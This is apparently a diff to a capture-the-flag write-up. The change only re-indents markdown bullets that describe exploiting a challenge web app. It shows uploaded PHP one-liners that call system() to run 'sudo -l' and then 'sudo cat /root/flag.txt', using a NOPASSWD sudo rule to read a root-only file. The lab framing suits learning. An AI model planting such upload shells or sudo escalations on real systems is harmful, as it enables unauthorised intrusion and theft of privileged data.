@@ -15,11 +15,11 @@ You can access the web application here!
   ```
   <?php system('sudo -l'); ?>
   ```
-  * To no surprise, Matching Defaults entries for www-data on challenge: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin User www-data may run the following commands on challenge: (ALL) NOPASSWD: ALL, we can run commands as any user
-  * Modify the PHP script
-    ```
-    <?php system('sudo cat /root/flag.txt'); ?>
-    ```
-  * After the upload, I head over to the website to find out that indeed it works since the flag is printed!
+* To no surprise, Matching Defaults entries for www-data on challenge: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin User www-data may run the following commands on challenge: (ALL) NOPASSWD: ALL, we can run commands as any user
+* Modify the PHP script
+ ```
+ <?php system('sudo cat /root/flag.txt'); ?>
+ ```
+* After the upload, I head over to the website to find out that indeed it works since the flag is printed!
   
   
